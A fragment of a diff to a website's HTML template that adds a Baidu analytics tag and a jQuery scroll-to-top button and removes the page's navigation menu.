+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F77edef7e6931022edbd2322ec66456e1' type='text/javascript'%3E%3C/script%3E"));
+</script>
+
+<div id="totop" style="position:fixed;bottom:150px;right:50px;cursor: pointer;">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
 </div>
+<script type="text/javascript">
+	(function($) { 
+		// When to show the scroll link
+		// higher number = scroll link appears further down the page   
+		var upperLimit = 300;
+		
+		// Our scroll link element
+		var scrollElem = $('#totop');
+	   
+		// Scroll to top speed
+		var scrollSpeed = 800;
+	   
+		// Show and hide the scroll to top link based on scroll position   
+		scrollElem.hide();
+		$(window).scroll(function () {            
+			var scrollTop = $(document).scrollTop();       
+			if ( scrollTop > upperLimit ) {
+				$(scrollElem).stop().fadeTo(300, 1); // fade back in           
+			}else{       
+				$(scrollElem).stop().fadeTo(300, 0); // fade out
+			}
+		});
+		// Scroll to top animation on click
+		$(scrollElem).click(function(){
+			$('html, body').animate({scrollTop:0}, scrollSpeed); return false;
+		});
+	})(jQuery);
+</script>
 
-<nav  class="outer-nav top horizontal">
 
-          <a class="icon-home"  href="/"><span>Home</span></a>
+  </body>
+ </html>
 
-          <a class="icon-news"  href="/archives"><span>Archive</span></a>
-
-          <a class="icon-image"  href="/images"><span>Images</span></a>
-
-          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
-
-          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
-
-          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
-
-</nav>
-
-</div>
-</body>
-</html>
